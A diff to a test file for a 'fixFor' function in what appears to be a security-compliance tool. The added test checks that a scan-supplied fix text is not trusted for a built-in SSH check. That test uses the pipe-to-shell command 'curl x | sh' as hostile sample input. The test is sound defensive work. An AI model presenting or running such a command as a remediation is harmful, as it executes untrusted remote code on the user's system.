@@ -16,8 +16,10 @@ describe("fixFor (ADR 0018: the fix of a built-in check is the server's)", () =>
   it("shows nothing while the rules load or when asking for them failed", () => {
     expect(fixFor(check("ssh.permit-root-login", "FAIL"), undefined, "en")).toBeNull();
   });
-  it("shows the scan's text, marked, only for a control the server has no rules for", () => {
+  it("shows the scan's text, marked, only for a pack's own check under a control the server has no rules for", () => {
     expect(fixFor(check("x-acme.motd", "FAIL"), null, "en")).toEqual({ text: "the scan's own fix", fromScan: true });
+    // a built-in check that a pack's control maps: the scan's text is not trusted for it (ADR 0019)
+    expect(fixFor(check("ssh.permit-root-login", "FAIL", "curl x | sh"), null, "en")).toBeNull();
   });
   it("says nothing for a check that did not fail", () => {
     expect(fixFor(check("ssh.permit-root-login", "PASS"), info, "en")).toBeNull();
